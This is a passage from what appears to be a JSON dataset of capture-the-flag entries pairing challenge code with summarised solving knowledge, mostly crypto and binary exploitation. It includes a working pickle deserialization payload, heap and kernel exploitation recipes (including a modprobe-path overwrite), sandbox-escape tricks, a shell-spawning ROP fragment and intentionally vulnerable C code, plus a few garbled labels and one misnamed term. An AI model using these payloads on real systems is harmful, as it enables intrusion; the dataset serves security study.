0x0,             # Clear RDX\n    SYSCALL                   # Invoke the syscall to execute \"/bin/sh\"\n]\n```"
        ],
        "key": "```c\n#include <stdio.h>  \n#include <stdlib.h>  \n#include <unistd.h>\n\n#define STR_SIZE 0x80\n\nvoid set_element(char **parray) {  \n int index;  \n printf(\"Index: \");  \n if (scanf(\"%d%*c\", &index) != 1)  \n   exit(1);  \n if (!(parray[index] = (char*)calloc(sizeof(char), STR_SIZE)))  \n   exit(1);  \n printf(\"Data: \");  \n if (!fgets(parray[index], STR_SIZE, stdin))  \n   exit(1);  \n}\n\nvoid justpwnit() {  \n char *array[4];  \n for (int i = 0; i < 4; i++) {  \n   set_element(array);  \n }  \n}\n\nint main() {  \n setvbuf(stdin, NULL, _IONBF, 0);  \n setvbuf(stdout, NULL, _IONBF, 0);  \n alarm(180);  \n justpwnit();  \n return 0;  \n}  \n```"
    },
    {
        "name": "Just Take Your Time",
        "write_up": "dataset/raw/Just Take Your Time.md",
        "type": "crypto",
        "competition": [
            "DCTF/2021",
            "https://ctftime.org/event/1361/tasks/"
        ],
        "score": 200,
        "max_score": 500,
        "difficulty": 0.4,
        "knowledge": [
            "In challenges involving encryption with time-based keys, if the encryption algorithm uses the current time (timestamp) as part of the key, attempting to decrypt the ciphertext can be achieved by closely synchronizing the decryption attempt with the time the ciphertext was generated. This is especially relevant if the algorithm pads the key with predictable data (such as zeroes) to meet key length requirements. The synchronization can be achieved by generating the decryption key with the current time, assuming the challenge or application generating the ciphertext provides enough information to approximate the time of encryption within a small window (like within seconds of the encryption occurring).",
            "When dealing with DES (Data Encryption Standard) or Triple DES encryption, it's important to understand the role of parity bits in keys. DES keys include parity bits, and sometimes, even if a key is slightly off (such as by one bit), decryption can still succeed. This property could be exploited in CTF challenges or practical scenarios where you can predict or closely approximate the key. Being aware of this can lead to successful decryption even when the key used isn't an exact match but is close enough, particularly when the key generation process is based on predictable or accessible data (like a timestamp)."
        ],
        "key": "```python  \nkey = str(int(time())).zfill(16).encode(\"utf-8\")  \nsecret = token_hex(16)  \ncipher = DES3.new(key, DES3.MODE_CFB, b\"00000000\")  \nencrypted = cipher.encrypt(secret.encode(\"utf-8\"))  \nprint(\"You have proven yourself to be capable of taking on the final task.\nDecrypt this and the flag shall be yours!\")  \nprint(encrypted.hex())  \n```"
    },
    {
        "name": "Kaffee oder Bier_!",
        "write_up": "dataset/raw/Kaffee oder Bier_!.md",
        "type": "crypto",
        "competition": [
            "ASIS/2020/Quals",
            "https://ctftime.org/event/964/tasks/"
        ],
        "score": -1.0,
        "max_score": 375,
        "difficulty": -1,
        "knowledge": [
            "In scenarios involving custom encryption algorithms where encryption is performed character by character and results in identical output for identical input characters, an effective approach is to create a substitution table by encrypting every possible character in the character set. This method leverages the fact that the encryption behaves similarly to ECB mode, making it predictable and allowing for the recovery of encrypted messages through matching. This approach is particularly useful when dealing with algorithms that are computationally intensive or poorly optimized, as it avoids the need to reverse-engineer or reimplement the encryption logic.\n\n    ```python\n    def worker(c):\n       input_file = str(ord(c)) + \".txt\"\n       output_file = str(ord(c)) + \".enc\"\n       with codecs.open(input_file,'wb') as f:\n           f.write(c)\n       os.system(\"./COB \" + input_file + \" \" + output_file)\n    ```",
            "After generating encrypted representations for each character in the charset using the method described in point 1, one can proceed to decrypt an encrypted message by constructing a mapping from the encrypted characters to their plaintext equivalents. By splitting the encrypted message at predetermined separators (e.g., \"0000\" used in this challenge to separate encrypted character representations) and leveraging the previously generated mapping, the original message can be reconstructed. This method assumes the availability of or ability to generate a comprehensive mapping between plaintext characters and their encrypted counterparts.\n\n    ```python\n    for c in enc.split(\"0000\"):\n        if str(int(c)) in mapping:\n            res += mapping[str(int(c))]\n        else:\n            res += '?'\n    print(res)\n    ```"
        ],
        "key": "```c\nuint result;  \nint i;  \n  \nresult = 0;  \ni = 1;  \nwhile ((ulong)(long)i < input_char) {  \n  if (input_char % (long)i == 0) {  \n    result = result ^ 1;  \n  }  \n  i = i + 1;  \n}  \nreturn (ulong)result;\n```"
    },
    {
        "name": "Karen",
        "write_up": "dataset/raw/Karen.md",
        "type": "crypto",
        "competition": [
            "zer0pts/2022",
            "https://ctftime.org/event/1555/tasks/"
        ],
        "score": -1,
        "max_score": -1,
        "difficulty": -1,
        "knowledge": [
            "For cryptographic challenges involving the Hidden Subset Sum Problem, where the challenge setup resembles the knapsack cipher, and one only knows the encrypted message but not the public key, the reference to the state-of-art algorithm and implementation from the paper titled \"A Polynomial-Time Algorithm for Solving the Hidden Subset Sum\" can be employed. This paper, accepted at CRYPTO20, includes applicable code snippets in SageMath, demonstrating a practical approach to tackle such challenges.",
            "In scenarios where the challenge parameters, such as `n` and `m` in a matrix context, are specifically provided and fit within the feasible solution space of a known algorithm (like the Nguyen-Stern algorithm for the Hidden Subset Sum Problem), conducting experiments with these algorithms can lead to the successful decryption of the flag. This approach requires running the algorithm against the output given by the challenge, adjusting it as necessary to fit the challenge constraints.\n\nExample application of related knowledge (Extracted from scenario and cannot directly apply to all cases):\n- Identify algorithm suitability based on challenge parameters (`n`, `m`, bit length of variables).\n- Apply and adjust provided code from reputable cryptographic papers or sources to solve the challenge."
        ],
        "key": "```python  \nwith open(\"flag.txt\", \"rb\") as f:  \n   flag = int.from_bytes(f.read(), \"big\")\n\nn = 70  \nm = flag.bit_length()  \nassert n < m  \np = random_prime(2**512)\n\nF = GF(p)  \nx = random_matrix(F, 1, n)  \nA = random_matrix(ZZ, n, m, x=0, y=2)  \nA[randint(0, n-1)] = vector(ZZ, Integer(flag).bits())  \nh = x*A\n\nprint(p)  \nprint(list(h[0]))  \n```"
    },
    {
        "name": "Karte",
        "write_up": "dataset/raw/Karte.md",
        "type": "pwn",
        "competition": [
            "TSG/2020",
            "https://ctftime.org/event/1004/tasks/"
        ],
        "score": 341,
        "max_score": 428,
        "difficulty": 0.7967289719626168,
        "knowledge": [
            "In challenges involving heap exploitation under glibc versions 2.28 and above, using Uninitialized After Free (UAF) vulnerabilities to overwrite the `bk` pointer of a smallbin chunk can bypass the tcache double-free protection. This technique can allow for arbitrary address manipulation by directing `malloc` to return a pointer to a controlled location. Here, the condition is having a UAF bug that does not get caught by the tcache mechanism, which was strengthened in glibc-2.28 to prevent simple double-free vulnerabilities.",
            "Exploiting heap vulnerabilities to modify application behavior can involve manipulating internal data structures such as the `tcache` and `smallbins`. By carefully crafting fake chunks and using the `tcache_stashing` technique, an attacker can cause `malloc` to stash other chunks into the `tcache`, leading to controlled writes. This approach manifests through overwriting function pointers or authorization flags to escalate privileges within the application. The condition for this knowledge is the presence of a heap-based vulnerability that allows for arbitrary write operations, particularly in environments where the heap layout and behavior are well-understood by the attacker."
        ],
        "key": "```c\ntypedef struct {  \n   unsigned long long size;  \n   unsigned long long id;  \n   unsigned long long data[];  \n}__attribute__((__packed__)) Vec;  \n\n#if USE_TCACHE  \n\t  /* While we're here, if we see other chunks of the same size,  \n\t     stash them in the tcache.  */  \n\t  size_t tc_idx = csize2tidx (nb);  \n\t  if (tcache && tc_idx < mp_.tcache_bins)  \n\t    {  \n\t      mchunkptr tc_victim;\n\n\t      /* While bin not empty and tcache not full, copy chunks over.  */  \n\t      while (tcache->counts[tc_idx] < mp_.tcache_count  \n\t\t     && (tc_victim = last (bin)) != bin)  \n\t\t{  \n\t\t  if (tc_victim != 0)  \n\t\t    {  \n\t\t      bck = tc_victim->bk;  \n\t\t      set_inuse_bit_at_offset (tc_victim, nb);  \n\t\t      if (av != &main_arena)  \n\t\t\tset_non_main_arena (tc_victim);  \n\t\t      bin->bk = bck;  \n\t\t      bck->fd = bin;\n\n\t\t      tcache_put (tc_victim, tc_idx);  \n\t            }  \n\t\t}  \n\t    }  \n#endif  \n```"
    },
    {
        "name": "Katherine",
        "write_up": "dataset/raw/Katherine.md",
        "type": "crypto",
        "competition": [
            "BalCCon/2020",
            "https://ctftime.org/event/1100/tasks/"
        ],
        "score": 486,
        "max_score": 497,
        "difficulty": 0.9778672032193159,
        "knowledge": [
            "When attempting to compromise a system utilizing Elliptic Curve Diffie-Hellman (ECDH) for authentication, and direct access to the target's private key is impossible, consider employing a Key Compromise Impersonation (KCI) attack if you can obtain the private key of a party that the target trusts. This approach allows for impersonation by deriving shared keys without needing the actual private key of the impersonated entity. KCI attacks exploit the trust relationship and rely on possessing the private key of a trusted party by the target, enabling attackers to bypass authentication checks.",
            "In scenarios where secret keys are derived from easily guessable or weak secrets, such as PINs, a brute-force attack can be surprisingly effective. This method relies on the knowledge that many systems use insufficiently secure methods to protect and generate private keys. By trying all possible combinations of the weak secret (with knowledge of its format, such as being a numeric PIN of a certain length), an attacker can derive the corresponding private key. Once obtained, this key can facilitate further attacks, such as impersonating a user or decrypting communications. This technique underscores the importance of using strong, unpredictable methods for key derivation. \n\n   Example brute-force approach for PIN-derived keys:\n   ```python\n   for pin in product('0123456789', repeat=r):  \n       pin = ''.join(pin)  \n       if encode_publickey(get_server_privatekey(pin)) == server_puk_enc:  \n           print('Cracked! pin:', pin)  # Example pin that was cracked: 7741\n   ```"
        ],
        "key": "```python\ndef get_server_privatekey(pin: str) -> x25519.X25519PrivateKey:  \n   digest = hashes.Hash(hashes.SHA3_256(), backend=default_backend())  \n   digest.update(pin.encode())  \n   privatekey_bytes = digest.finalize()  \n   return x25519.X25519PrivateKey.from_private_bytes(privatekey_bytes)\n\nprivate_key = get_server_privatekey(argv[1])  \n```"
    },
    {
        "name": "kernel-rop",
        "write_up": "dataset/raw/kernel-rop.md",
        "type": "reverse",
        "competition": [
            "HXP/2020",
            "https://ctftime.org/event/1134/tasks/"
        ],
        "score": 667,
        "max_score": 1000,
        "difficulty": 0.667,
        "knowledge": [
            "When facing kernel-level vulnerabilities, especially with protections like FG-KASLR (Fine-Grained Kernel Address Space Layout Randomization), identifying static areas or symbols within the kernel memory that do not change across reboots can be crucial. These non-randomized points can be leveraged as reliable gadgets for constructing a ROP (Return Oriented Programming) chain or for information leaks. It's effective to examine symbols at the start of the kernel image and certain kernel structures such as `ksymtab` which contains real symbol offsets and could be utilized for developing an exploit.",
            "In scenarios involving kernel exploitation, it's possible to modify kernel memory directly to alter execution flow or manipulate kernel functionalities. An example is overwriting specific kernel strings, such as `/sbin/modprobe`, to point to a malicious script or binary. This can trigger arbitrary code execution within the kernel context when the modified kernel path is accessed. This technique requires finding and using non-randomized gadgets within the kernel to perform the necessary memory modifications. Example payload or technique: If a gadget allows writing arbitrary values to a specified address (`write-what-where`), it could be used to overwrite the memory address of `/sbin/modprobe` string in kernel memory to point to a controlled path like `/tmp/malicious_script`."
        ],
        "key": "```c\nvoid vulnerable_function(char *input) {\n    char buffer[64];\n    strcpy(buffer, input); // Trivial stack buffer overflow\n}\n```"
    },
    {
        "name": "Kevin Higgs",
        "write_up": "dataset/raw/Kevin Higgs.md",
        "type": "The type of this CTF challenge is **crypto**.",
        "competition": [
            "angstrom/2022",
            "https://ctftime.org/event/1588/tasks/"
        ],
        "score": 210,
        "max_score": 250,
        "difficulty": 0.84,
        "knowledge": [
            "In a challenge involving Python pickle deserialization vulnerabilities, if restrictions on the accessible modules and functions are applied, leverage built-in functionalities and indirect access methods. Specifically, use the pickle protocol to execute custom code by building a serialized object that utilizes allowed methods (`__setattr__`, `__getattribute__`, etc.) to dynamically access and invoke Python internal functionalities (e.g., accessing `__builtins__` for `eval` execution). This technique bypasses restrictions on direct access to dangerous functions or modules.",
            "When you are limited by constraints related to the depth of attribute access (e.g., not being able to use more than one dot in method arguments), employ intermediate steps to build the payload. This involves manipulating an accepted \"empty\" module or any other allowed entities by sequentially setting attributes to reach deeper functionalities. This incremental setup allows for the assembly of a complex execution chain, ultimately leading to arbitrary code execution or reading sensitive files (like \"/flag.txt\"). \n\nExample Payload:\n```\n\\x80\\x04' \\  \n'Vempty\\nV__class__.__base__\\n\\x93p0\\n' \\  \n'(Vempty\\nV__setattr__\\n\\x93p1\\n' \\  \n'g1\\n(Vobj\\ng0\\ntR' \\  \n'Vempty\\nVobj.__getattribute__\\n\\x93p2\\n' \\  \n'g1\\n(Vsc\\nVempty\\nVobj.__subclasses__\\n\\x93)RtR' \\  \n'Vempty\\nVsc.__getitem__\\n\\x93p3\\n' \\  \n'g1\\n(Vi\\ng2\\n(g3\\n(I100\\ntRV__init__\\ntRtR' \\  \n'g1\\n(Vgl\\nVempty\\nVi.__globals__\\n\\x93tR' \\  \n'Vempty\\nVgl.__getitem__\\n\\x93p4\\n' \\  \n'g1\\n(Vb\\ng4\\n(V__builtins__\\ntRtR' \\  \n'Vempty\\nVb.__getitem__\\n\\x93p5\\n' \\  \n'g1\\n(Ve\\ng5\\n(Veval\\ntRtR' \\  \n'Vempty\\nVe\\n\\x93(Vprint(open(\"/flag.txt\").read())\\ntR.'\n```"
        ],
        "key": "```python\n#!/usr/local/bin/python3\n\nimport pickle  \nimport io  \nimport sys\n\nmodule = type(__builtins__)  \nempty = module(\"empty\")  \nempty.empty = empty  \nsys.modules[\"empty\"] = empty\n\nclass SafeUnpickler(pickle.Unpickler):  \n   def find_class(self, module, name):  \n       if module == \"empty\" and name.count(\".\") <= 1:  \n           return super().find_class(module, name)  \n       raise pickle.UnpicklingError(\"e-legal\")\n\nlepickle = bytes.fromhex(input(\"Enter hex-encoded pickle: \"))  \nif len(lepickle) > 400:  \n   print(\"your pickle is too large for my taste >:(\")  \nelse:  \n   SafeUnpickler(io.BytesIO(lepickle)).load()  \n```"
    },
    {
        "name": "Kindergarten PWN",
        "write_up": "dataset/raw/Kindergarten PWN.md",
        "type": "pwn",
        "competition": [
            "P.W.N/2018",
            "https://ctftime.org/event/639/tasks/"
        ],
        "score": 204,
        "max_score": 792,
        "difficulty": 0.25757575757575757,
        "knowledge": [
            "When exploiting buffer overflow vulnerabilities, especially in scenarios involving stack-based buffers, it is feasible to overwrite adjacent memory areas if boundary checks are misimplemented. If an application performs boundary checks based solely on the index (e.g., `if ( v2 <= 0xFC )`) without considering the size of the elements being accessed multiplied by this index, an attacker can access and manipulate memory outside the intended bounds. This can lead to information disclosure (e.g., leaking stack canary, libc addresses) or arbitrary code execution via Return Oriented Programming (ROP) techniques. Example exploit steps include filling the buffer up to the canary to leak its value, then overwriting the return address with a prepared ROP chain.",
            "Negative index vulnerability exploitation is applicable in cases where an application allows the user to specify an array index without properly checking if it is non-negative. This kind of vulnerability can be leveraged to read from or write to memory locations before the array, potentially allowing modification of critical program data structures like the Global Offset Table (GOT). This can be utilized to leak libc addresses or redirect the execution flow to arbitrary functions such as `one_gadget` for achieving an unintended behavior (e.g., spawning a shell). The exploitation process can involve providing a negative index that effectively references memory positions of interest such as GOT entries, allowing an attacker to read or override their values."
        ],
        "key": "```c\nunsigned __int64 __fastcall writeData(char *a1)  \n{  \n unsigned int v2; // [rsp+4h] [rbp-14h]  \n unsigned __int64 v3; // [rsp+8h] [rbp-10h]\n\n v3 = __readfsqword(0x28u);  \n puts(\"Which entry to write?\");  \n v2 = 0;  \n __isoc99_scanf(\"%u\", &v2;;  \n if ( v2 <= 0xFC )  \n {  \n   puts(\"What to write?\");  \n   read(0, &a1[12 * v2], 0xCuLL);  \n }  \n return __readfsqword(0x28u) ^ v3;  \n}\n```\n\n```c\nchar vulnbuf[1024]; // [rsp+0h] [rbp-420h]  \nint (__fastcall *func_addr)(char *, int, int); // [rsp+400h] [rbp-20h]  \n//...  \nfread(vulnbuf, 1uLL, (signed int)vullen, stdin);  \nfunc_addr(vulnbuf, vullen, v7);\n```\n\n```c\nif ( v5 <= 31 )//v5 < 0  \n{  \n  printf(\"the value at %d is %hhd. give me a new value:\\n> \", (unsigned\nint)v5, (unsigned int)array[v5]);  \n  v3 = &v4;  \n  if ( (unsigned int)__isoc99_scanf(\"%hhd\", &v4) != 1 )  \n    break;  \n  array[v5] = v4;  \n}\n```"
    },
    {
        "name": "kipferl",
        "write_up": "dataset/raw/kipferl.md",
        "type": "crypto",
        "competition": [
            "HXP/2021",
            "https://ctftime.org/event/1447/tasks/"
        ],
        "score": 227,
        "max_score": 1000,
        "difficulty": 0.227,
        "knowledge": [
            "When dealing with cryptographic algorithms that involve elliptic curves, understanding whether the generator lies on the original curve or its twist significantly impacts the computations. For elliptic curve-based challenges, especially those involving Diffie-Hellman key exchanges, precomputing potential generators and their characteristics (original curve or twist) can drastically improve the efficiency of solving these challenges. Implementing this technique involves generating hashes of potential passwords, checking if they can be points on the curve or its twist, and storing these results for later use during the attack phase. This approach leverages parallel processing to accommodate time constraints effectively.",
            "In cryptography challenges, especially when related to Diffie-Hellman or Elliptic Curve Diffie-Hellman, leverage Montgomery ladder implementation for scalar multiplication to optimize performance. This method can be particularly useful in situations where scalar multiplication operations are slow and need to be performed numerous times within a limited period. The Montgomery ladder technique improves computation time while maintaining security, as demonstrated in the challenge script with the `xDBLADD` and `xMUL` functions for Elliptic Curve point multiplication. This approach fits well in scenarios requiring efficient computation of large numbers of elliptic curve point multiplications within time constraints.\n\nExample payload snippet for optimized scalar multiplication using Montgomery ladder:\n```python\ndef xDBLADD(P,Q,PQ):  \n    (X1,Z1), (X2,Z2), (X3,Z3) = PQ, P, Q  \n    X4 = (X2**2-a*Z2**2)**2-8*b*X2*Z2**3  \n    Z4 = 4*(X2*Z2*(X2**2+a*Z2**2)+b*Z2**4)  \n    X5 = Z1*((X2*X3-a*Z2*Z3)**2-4*b*Z2*Z3*(X2*Z3+X3*Z2))  \n    Z5 = X1*(X2*Z3-X3*Z2)**2  \n    X4,Z4,X5,Z5 = (c%q for c in (X4,Z4,X5,Z5))  \n    return (X4,Z4), (X5,Z5)\n```"
        ],
        "key": "```python\ndef xDBLADD(P,Q,PQ):  \n    (X1,Z1), (X2,Z2), (X3,Z3) = PQ, P, Q  \n    X4 = (X2**2-a*Z2**2)**2-8*b*X2*Z2**3  \n    Z4 = 4*(X2*Z2*(X2**2+a*Z2**2)+b*Z2**4)  \n    X5 = Z1*((X2*X3-a*Z2*Z3)**2-4*b*Z2*Z3*(X2*Z3+X3*Z2))  \n    Z5 = X1*(X2*Z3-X3*Z2)**2  \n    X4,Z4,X5,Z5 = (c%q for c in (X4,Z4,X5,Z5))  \n    return (X4,Z4), (X5,Z5)\n\ndef xMUL(P, k):  \n    Q,R = (1,0), P  \n    for i in reversed(range(k.bit_length()+1)):  \n        if k >> i & 1: R,Q = Q,R  \n        Q,R = xDBLADD(Q,R,P)  \n        if k >> i & 1: R,Q = Q,R  \n    return Q\n```"
    },
    {
        "name": "Klepto",
        "write_up": "dataset/raw/Klepto.md",
        "type": "crypto",
        "competition": [
            "IJCTF/2020",
            "https://ctftime.org/event/1003/tasks/"
        ],
        "score": 932,
        "max_score": 1000,
        "difficulty": 0.932,
        "knowledge": [
            "When analyzing RSA encryption with a unique key generation method involving an XOR operation with a fixed initial vector (IV) and bit manipulation, one can reverse-engineer the prime factors (p and q) by applying inverse operations. This method is specifically useful when the prime generation involves predictable bitwise operations, allowing for approximation and refinement to find the exact prime values. In the scenario where RSA key generation involves XOR with an IV and bit shifting, calculate an approximate value for one of the primes (p_approx) by reversing the operations, and then adjust within a certain range to find the exact prime.\n\n   Example steps to reverse-engineer prime p:\n   ```python\n   p_approx = (n >> 1024) ^ iv  # Initial approximation of p by reversing key generation steps\n   r = range_limit  # Define range limit for correction\n   for adjustment in range(-r, r + 1):  # Iterate over a range to correct the approximation\n       potential_p = p_approx + adjustment\n       if n % potential_p == 0:  # Check if the corrected approximation divides n exactly\n           p = potential_p  # Exact prime p found\n           break\n   ```",
            "Once the prime factors (p and q) of an RSA public key are identified, one can proceed to decrypt the ciphertext using the RSA decryption formula which involves calculating the private exponent (d). The private exponent is computed using the modular inverse of the public exponent (e, typically 65537) and the totient of n (which is (p-1)*(q-1) for prime factors p and q). This approach is universally applicable for RSA decryption when the prime factors can be precisely determined.\n\n   Example code snippet for decrypting RSA ciphertext:\n   ```python\n   import gmpy2\n   p = # obtained prime factor\n   q = n / p  # obtain the other prime factor\n   e = 65537  # typical public exponent\n\n   # Compute totient\n   totient_n = (p - 1) * (q - 1)\n   # Compute private exponent\n   d = gmpy2.invert(e, totient_n)\n   # Decrypt ciphertext\n   decrypted_message = pow(ciphertext, d, n)\n   print(decrypted_message)\n   ```"
        ],
        "key": "```python  \nIV =\n5326453656607417485924926839199132413931736025515611536784196637666048763966950827721156230379191350953055349475955277628710716247141676818146987326676993279104387449130750616051134331541820233198166403132059774303658296195227464112071213601114885150668492425205790070658813071773332779327555516353982732641;\nseed = 0; temp = [0, 0]; key = 0  \nwhile(key != 2):  \n   if key == 0:  \n       seed = getrandbits(1024) | (2 ** 1023 + 1)  \n   seed_ = seed ^ IV  \n   n = seed_ << 1024 | getrandbits(1024)  \n   seed = n//seed | 1  \n   while(1):  \n       seed += 2;  \n       ## primarity checks  \n   temp[key] = seed  \nreturn(temp[0], temp[1])  \n```"
    },
    {
        "name": "kmemo",
        "write_up": "dataset/raw/kmemo.md",
        "type": "misc",
        "competition": [
            "SECCON/2023/Quals",
            "https://ctftime.org/event/2003/tasks/"
        ],
        "score": 365,
        "max_score": 500,
        "difficulty": 0.73,
        "knowledge": [
            "When debugging kernel modules, especially for vulnerability assessment or reverse engineering, several tools and techniques are pivotal. They include using Elixir for browsing kernel source code, extracting `vmlinux` from `bzImage` with `binwalk -e`, and using `ida-kallsyms` to extract and import kallsyms into decompilers. Additionally, understanding struct layouts, non-exported symbols, and turning off KASLR (Kernel Address Space Layout Randomization) can simplify debugging. Adding breakpoints in the kernel and module using GDB attached via qemu's gdbstub is essential for observing runtime behavior and tracing vulnerabilities.",
            "In kernel module exploitation, particularly for Use-After-Free (UAF) vulnerabilities, understanding and manipulating kernel data structures is key. In this scenario, exploiting a UAF vulnerability involves creating conditions for overlapping a user-controlled page (attacker page) with a kernel data structure (victim page). This setup provides arbitrary read-write access which can be leveraged for further exploitation, such as modifying kernel page table entries or executing privilege escalation payloads. A practical exploitation approach involves manipulating page tables and leveraging direct physical map (DPM) addresses to access or modify kernel memory and structures, ultimately achieving root privileges.\n\nKnowledge Application Scenario: Kernel exploitation tasks focusing on memory corruption, specifically UAF vulnerabilities. These insights can be adapted to various similar kernel-level exploitation challenges, emphasizing the significance of thorough kernel internals understanding, debugging techniques, and creative manipulation of kernel structures for successful exploitation."
        ],
        "key": "```c\nstatic vm_fault_t mmap_fault(struct vm_fault *vmf){  \n       struct memo *memo = vmf->vma->vm_private_data;  \n       if(!memo)  \n               return VM_FAULT_OOM;\n\n       char *data = get_memo_rw(memo, vmf->pgoff << PAGE_SHIFT);  \n       if(!data)  \n               return VM_FAULT_OOM;\n\n       vmf->page = virt_to_page(data);\n\n       return 0;  \n}  \n```"
    },
    {
        "name": "Knapsack",
        "write_up": "dataset/raw/Knapsack.md",
        "type": "The type of this challenge is: crypto",
        "competition": [
            "BackdoorCTF/2023",
            "https://ctftime.org/event/2153/tasks/"
        ],
        "score": -1,
        "max_score": 500,
        "difficulty": -1,
        "knowledge": [
            "When facing a knapsack cryptosystem challenge with a high density, unable to use lattice-based techniques like LLL (Lenstra\u2013Lenstra\u2013Lov\u00e1sz), employing a \"meet-in-the-middle\" approach could render the problem tractable. This strategy is effective when the problem involves a large but manageable subset, e.g., testing all possible subsets of the last 21 elements of a sequence to find a valid solution. The feasibility of this approach relies on the existence of a property that allows solving portions of the challenge in linear time, such as when each weight in a knapsack problem is greater than the sum of all previous weights.",
            "In cryptanalysis and related CTF challenges, when direct greedy algorithms fail due to certain constraints (e.g., the last subset of elements not necessarily being in increasing order), combining brute-force techniques (like trying every possible subset for a subset of elements) with greedy algorithms for the rest can be a powerful strategy. This hybrid approach allows handling elements that don't fit the necessary greedy algorithm's prerequisites by exhaustive search, while efficiently solving for the rest of the elements using the greedy method. This method effectively reduces computational complexity from potentially infeasible to manageable, as demonstrated in scenarios where the flag size or the sequence length is comparatively large but with a manageable subset for brute-forcing.\n   \n   Example of hybrid approach combining brute-force and greedy algorithm:\n   ```\n   from itertools import chain, combinations\n   # Powerset function to generate all combinations of a subset\n   def powerset(iterable):\n       s = list(iterable)\n       return chain.from_iterable(combinations(s, r) for r in range(len(s)+1))\n   \n   # Greedy algorithm for the rest of the elements\n   def greedy(ll, target):\n       out = set()\n       for i in range(len(ll) - 1, -1, -1):\n           if ll[i] <= target:\n               target -= ll[i]\n               out.add(i)\n       return out, target\n   \n   # Example usage\n   b = [weights]  # array of weights\n   c = sum  # target sum\n   to_iter = range(len(b) - 21, len(b))\n   ps = powerset(to_iter)\n   \n   for comb in ps:\n       target = c\n       for cc in comb:\n           target -= b[cc]\n       if target < 0:\n           continue\n       nout, nt = greedy(b[:-21], target)\n       if nt == 0:\n           # Solution found\n           break\n   ```"
        ],
        "key": "```python\nimport random\n\ndef generate_weights_and_modulus(n):\n    r = random.choice([i for i in range(2, 256) if is_prime(i)])  # Random 8-bit prime\n    w = [random.randint(1, 69)]\n    for i in range(1, n):\n        w.append(random.randint(sum(w), r * w[i - 1]))\n    q = next_prime(r * w[n - 21])\n    b = [(r * w_i) % q for w_i in w]\n    return b, q\n\ndef is_prime(num):\n    if num < 2:\n        return False\n    for i in range(2, int(num ** 0.5) + 1):\n        if num % i == 0:\n            return False\n    return True\n\ndef next_prime(num):\n    while True:\n        num += 1\n        if is_prime(num):\n            return num\n\n# Example usage\nn = 207  # Number of bits in the flag\nb, q = generate_weights_and_modulus(n)\n```"
    },
    {
        "name": "Knowledge Repository",
        "write_up": "dataset/raw/Knowledge Repository.md",
        "type": "misc",
        "competition": [
            "Sunshine/2023",
            "https://ctftime.org/event/2079/tasks/"
        ],
        "score": 311,
        "max_score": 450,
        "difficulty": 0.6911111111111111,
        "knowledge": [
            "When working with challenges involving encoded messages within files, such as audio files containing morse code, it is effective to use online decoding tools to convert the morse code to text. This approach is practical for extracting hidden texts or clues that can lead to solving the challenge. For example, using an online morse code decoding tool to translate audio signals into text.",
            "In challenges that involve a large number of commits in a git repository, each modifying a file that contributes to a larger message or code, automate the extraction and processing of each file's content. Scripting the extraction of file revisions and decoding or assembling their contents based on commit history allows for efficient handling of data and revelation of hidden messages or codes. This might include decoding base32 or base64 encoded texts that have been split across multiple commits or files. An example Python script snippet for iterating over files in a directory, comparing them, and assembling the characters into a complete message could resemble:\n   \n   ```python\n   import os\n   import base64\n   \n   # Initialize an empty list or dictionary to store the extracted characters\n   extracted_data = []\n   \n   # Assuming filenames contain the order and character, e.g., \"001_A.txt\"\n   for filename in sorted(os.listdir('path/to/extracted/files')):\n       with open(f'path/to/extracted/files/{filename}', 'r') as file:\n           # Extract and process the file content\n           # This step varies depending on the challenge's specifics, such as decoding morse from audio files\n           data = file.read().strip()\n           extracted_data.append(data)\n   \n   # Convert the list of characters into a string\n   decoded_message = ''.join(extracted_data)\n   \n   # If the message is encoded, use the appropriate decoding method\n   final_message = base64.b64decode(decoded_message).decode('utf-8')\n   print(final_message)\n   ```\n   \n   This example assumes the challenge's data extraction mechanism is known and focuses on combining those pieces programmatically."
        ],
        "key": "```python\nimport filecmp  \nimport os  \nimport sys\n\nf1 = sys.argv[1]  \nvalue = f1.split(\"_\")[1]  \nprint(value)\n\nfor f2 in os.listdir(\".\"):  \n   if f1 == f2: continue  \n   if filecmp.cmp(f1, f2, shallow=True):  \n       name = os.path.splitext(f2)[0] + \"_\" + value  \n       os.rename(f2, name)  \n       print(f\"{f1} same as {f2}, rename to {name}\")  \n```\n\n```python\nimport os\n\nfoo = [0]*4000\n\nfor f2 in os.listdir(\"../foo/gather\"):  \n   x = f2.split(\"_\")  \n   print(x)  \n   num = int(x[1].split(\".\")[0])  \n   foo[num] = x[0]\n\nnum = [\"zero\", \"one\", \"two\", \"three\", \"four\", \"five\", \"six\", \"seven\", \"eight\",\n\"nine\"]\n\nf = open(\"out.txt\", \"w\")  \ns = \"\"  \nfor i, x in enumerate(foo[::-1]):  \n   if not isinstance(x, str):  \n       print(\"skipping\", i, x)  \n       continue  \n   y = str.upper(x[0])  \n   if x in num:  \n       y = str(num.index(x))  \n   s = s + y  \nf.write(s)  \nf.close()  \n```"
    },
    {
        "name": "Krampus's Lair",
        "write_up": "dataset/raw/Krampus's Lair.md",
        "type": "crypto",
        "competition": [
            "X-MAS/2020",
            "https://ctftime.org/event/1209/tasks/"
        ],
        "score": 492,
        "max_score": 500,
        "difficulty": 0.984,
        "knowledge": [
            "In challenges involving restricted Python execution environments where direct string manipulation is not allowed, built-in functions like `hash()`, `chr()`, and arithmetic operations can be leveraged to generate arbitrary characters. This approach circumvents limitations on direct character and string usage by calculating Unicode code points through mathematical operations and converting them back to characters.",
            "When facing challenges with function or method call restrictions, exploiting the `getattr()` function combined with `min()`, `vars()`, and other built-ins to access and call Python object methods can achieve desired outcomes. Specifically, utilizing `min(vars(<type>))` to fetch the lexicographically smallest method name, such as `'__add__'` for strings or integers, facilitates operations like concatenation or arithmetic without directly invoking the methods by name. This technique relies on the predictable nature of Python's `vars()` function output and the ordering of strings to indirectly call methods through `getattr()`.\n   \n   Example payload components for constructing arbitrary values or concatenated strings:\n   - For numbers: `getattr(1, min(vars(int)))(2)` to achieve addition (resulting in `3`).\n   - For strings: `getattr('a', min(vars(str)))('b')` to concatenate strings (resulting in `ab`)."
        ],
